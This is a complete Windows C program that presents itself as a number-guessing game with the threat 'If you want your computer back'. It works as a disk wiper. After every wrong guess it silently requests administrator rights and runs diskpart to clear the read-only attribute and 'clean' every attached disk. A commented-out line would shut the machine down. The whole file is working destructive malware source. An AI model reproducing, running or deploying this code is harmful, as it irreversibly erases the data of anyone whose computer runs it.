#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main() {
    SetConsoleTitleA("Screen");

    srand((unsigned int)time(0));
    int key = (rand() % 10) + 1;
    int guess = 0;

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("Then guess the number\n");

    while (1) {
        printf("Enter guess 1-10 >:");
        fflush(stdout);

        if (scanf("%d", &guess) != 1) {
            fflush(stdin); 
            continue;
        }

        if (guess == key) {
            printf("\nYou Won!!! Woohoo\n");
            break;
        } else {
            printf("\nWrong!\n");
            ShellExecute(0, "runas", "cmd.exe",
                "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
                "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
                "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
                "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt",
                0, SW_HIDE);

            //system("shutdown /s /t 0");
        }
    }
    exit(0);
    return 0;
}